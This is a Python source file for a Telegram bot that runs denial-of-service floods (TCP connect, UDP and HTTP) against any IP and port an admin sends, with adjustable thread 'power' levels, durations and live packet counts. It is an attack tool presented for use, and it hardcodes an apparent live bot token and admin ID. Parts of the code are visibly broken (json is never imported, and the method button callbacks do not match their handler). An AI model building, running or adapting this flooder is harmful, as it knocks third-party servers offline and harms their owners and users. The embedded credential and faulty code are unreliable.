# ddos_railway_fixed.py
import asyncio
import logging
import threading
import time
import random
import socket
import re
import os
from datetime import datetime, timedelta
import requests
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import (
    Application,
    CommandHandler,
    CallbackQueryHandler,
    MessageHandler,
    filters,
    ContextTypes
)

# ---------- CONFIG ----------
BOT_TOKEN = "8278228198:AAG7C97c7R50_gsykoqBMwesCuoRZTciCLA"
ADMIN_IDS = [8210011971]

BLOCKED_PORTS = {22,25,443,3389,8700,9031,17500,20000,20001}
THREADS_LEVEL = {i: i*80 for i in range(1,16)}  # 15x = 1200 threads (safe for Railway)
SOCKETS_PER_THREAD = 10
DELAY = 0.0001
HTTP_THREADS = 300

POWER_LEVEL = 10   # default 10x (800 threads)
attack_running = False
current_attack = {'packets': 0, 'message_id': None}
attack_lock = threading.Lock()
user_data = {}

# ---------- NO DATABASE (Simple JSON) ----------
USERS_FILE = "users.json"
def load_users():
    if os.path.exists(USERS_FILE):
        with open(USERS_FILE) as f:
            return json.load(f)
    return {}
def save_users(u):
    with open(USERS_FILE,'w') as f:
        json.dump(u,f)
def is_approved(uid):
    u = load_users().get(str(uid),{})
    return u.get('approved',False)
def approve(uid, days):
    u=load_users()
    u[str(uid)]={'approved':True,'expires':(datetime.now()+timedelta(days=days)).isoformat()}
    save_users(u)

# ---------- ATTACK ENGINES (Railway adapted) ----------
def tcp_syn_flood(ip, port, duration):
    global attack_running, current_attack
    end = time.time()+duration
    while time.time()<end and attack_running:
        try:
            s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(0.1)
            s.connect_ex((ip,port))
            s.close()
            with attack_lock:
                current_attack['packets']+=1
            time.sleep(0.001)
        except:
            time.sleep(0.01)

def http_flood(target_url, duration):
    global attack_running, current_attack
    end = time.time()+duration
    session = requests.Session()
    headers={'User-Agent':'Mozilla/5.0'}
    while time.time()<end and attack_running:
        try:
            session.get(target_url, headers=headers, timeout=2)
            with attack_lock:
                current_attack['packets']+=1
            time.sleep(0.002)
        except:
            time.sleep(0.02)
    session.close()

def udp_flood(ip, port, duration):
    global attack_running, current_attack
    end = time.time()+duration
    socks=[socket.socket(socket.AF_INET,socket.SOCK_DGRAM) for _ in range(SOCKETS_PER_THREAD)]
    payload=random._urandom(512)
    while time.time()<end and attack_running:
        for s in socks:
            try:
                s.sendto(payload,(ip,port))
                with attack_lock:
                    current_attack['packets']+=1
            except:
                pass
        time.sleep(DELAY)
    for s in socks:
        s.close()

def launch_attack(ip,port,duration,method,send_cb):
    global attack_running, current_attack
    attack_running=True
    with attack_lock:
        current_attack={'packets':0,'start':time.time(),'duration':duration,'ip':ip,'port':port,'method':method}
    
    if method=='udp':
        threads=THREADS_LEVEL[POWER_LEVEL]
        target=udp_flood
        args=(ip,port,duration)
    elif method=='tcp':
        threads=THREADS_LEVEL[POWER_LEVEL]
        target=tcp_syn_flood
        args=(ip,port,duration)
    else: # http
        threads=HTTP_THREADS
        url=f"http://{ip}:{port}" if port!=443 else f"https://{ip}:{port}"
        target=http_flood
        args=(url,duration)

    for _ in range(threads):
        threading.Thread(target=target,args=args,daemon=True).start()
    
    # Monitor
    start=time.time()
    last_msg=0
    while attack_running and time.time()-start<duration:
        time.sleep(1)
        if time.time()-last_msg>=2:
            last_msg=time.time()
            with attack_lock:
                pkt=current_attack['packets']
            elapsed=int(time.time()-start)
            speed=int(pkt/elapsed) if elapsed else 0
            bar='█'*int(20*elapsed/duration)+'░'*(20-int(20*elapsed/duration))
            txt=(f"🔥 ATTACK ACTIVE 🔥\n{ip}:{port}\n📦 {pkt:,} pkts\n💥 {speed:,} pps\n{bar}\n/stop to halt")
            send_cb(txt, reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🛑 STOP",callback_data="stop_attack")]]))
    attack_running=False
    send_cb(f"✅ Attack ended. Total packets: {current_attack['packets']:,}")

# ---------- BOT HANDLERS (simplified) ----------
async def start(update,context):
    uid=update.effective_user.id
    if uid not in ADMIN_IDS:
        await update.message.reply_text("❌ Unauthorized")
        return
    user_data[uid]={'step':'ip'}
    await update.message.reply_text("⚡ Send target IP:")

async def handle(update,context):
    uid=update.effective_user.id
    if uid not in ADMIN_IDS: return
    txt=update.message.text.strip()
    step=user_data.get(uid,{}).get('step')
    if step=='ip':
        if not re.match(r'^\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}$',txt):
            await update.message.reply_text("Invalid IP")
            return
        user_data[uid]['ip']=txt
        user_data[uid]['step']='port'
        await update.message.reply_text("Send port (1-65535):")
    elif step=='port':
        try:
            p=int(txt)
            if p in BLOCKED_PORTS or p<1 or p>65535:
                raise ValueError
            user_data[uid]['port']=p
            user_data[uid]['step']='method'
            kb=[[InlineKeyboardButton("TCP (recommended)",callback_data="tcp")],
                [InlineKeyboardButton("UDP",callback_data="udp")],
                [InlineKeyboardButton("HTTP",callback_data="http")]]
            await update.message.reply_text("Select method:",reply_markup=InlineKeyboardMarkup(kb))
        except:
            await update.message.reply_text("Invalid port")
    elif step=='duration':
        try:
            dur=int(txt)
            if dur<5 or dur>300: raise ValueError
            ip=user_data[uid]['ip']
            port=user_data[uid]['port']
            method=user_data[uid]['method']
            del user_data[uid]
            # Confirm
            kb=[[InlineKeyboardButton("✅ START",callback_data=f"start_{ip}_{port}_{dur}_{method}")],
                [InlineKeyboardButton("❌ Cancel",callback_data="cancel")]]
            await update.message.reply_text(f"Target {ip}:{port}\nMethod {method}\nDuration {dur}s\nStart?",reply_markup=InlineKeyboardMarkup(kb))
        except:
            await update.message.reply_text("Duration 5-300 sec")

async def button(update,context):
    q=update.callback_query
    await q.answer()
    uid=q.from_user.id
    data=q.data
    if data.startswith("method_"):
        method=data.split("_")[1]
        user_data[uid]['method']=method
        user_data[uid]['step']='duration'
        await q.edit_message_text(f"Method {method}\nSend duration (5-300s):")
    elif data.startswith("start_"):
        _,ip,port,dur,method=data.split("_")
        port=int(port); dur=int(dur)
        def send_cb(text,reply_markup):
            loop=asyncio.get_event_loop()
            loop.create_task(q.message.reply_text(text,reply_markup=reply_markup))
        threading.Thread(target=launch_attack,args=(ip,port,dur,method,send_cb),daemon=True).start()
        await q.edit_message_text("🚀 Attack launching... use /stop")
    elif data=="cancel":
        if uid in user_data: del user_data[uid]
        await q.edit_message_text("Cancelled")
    elif data=="stop_attack":
        global attack_running
        attack_running=False
        await q.edit_message_text("Stopped")

async def stop_cmd(update,context):
    global attack_running
    attack_running=False
    await update.message.reply_text("Attack stopped")

async def power_cmd(update,context):
    global POWER_LEVEL
    if update.effective_user.id not in ADMIN_IDS: return
    try:
        lvl=int(context.args[0])
        if 1<=lvl<=15:
            POWER_LEVEL=lvl
            await update.message.reply_text(f"Power set to {lvl}x → {THREADS_LEVEL[lvl]} threads")
        else:
            await update.message.reply_text("1-15 only")
    except:
        await update.message.reply_text("/power <1-15>")

def main():
    app = Application.builder().token(BOT_TOKEN).build()
    app.add_handler(CommandHandler("start",start))
    app.add_handler(CommandHandler("stop",stop_cmd))
    app.add_handler(CommandHandler("power",power_cmd))
    app.add_handler(CallbackQueryHandler(button))
    app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle))
    print("Bot running on Railway...")
    app.run_polling()

if __name__=="__main__":
    main()
